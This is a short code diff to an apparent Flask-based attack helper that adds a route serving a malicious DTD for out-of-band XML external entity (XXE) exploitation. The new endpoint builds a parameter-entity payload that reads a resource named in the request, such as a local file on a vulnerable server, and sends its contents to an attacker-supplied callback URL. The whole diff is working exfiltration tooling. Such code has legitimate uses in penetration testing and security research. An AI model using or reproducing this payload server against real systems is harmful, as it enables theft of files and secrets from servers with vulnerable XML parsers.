@@ -16,6 +16,18 @@ def oob():
     else:
         abort(404, description="Missing external entity parameter 'resource'.")
 
+@app.route("/oob2.dtd", methods=["GET"])
+def oob2():
+    global callback
+    if request.args.get('resource'):
+        if request.args.get('callback'):
+            callback = request.args.get('callback')
+
+        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY oob SYSTEM \'' + callback + '/?x=%ext;\'>">%eval;'
+        return Response(xml, mimetype='text/xml')
+    else:
+        abort(404, description="Missing external entity parameter 'resource'.")
+
 @app.route("/error.dtd", methods=["GET"])
 def error():
     if request.args.get('resource'):
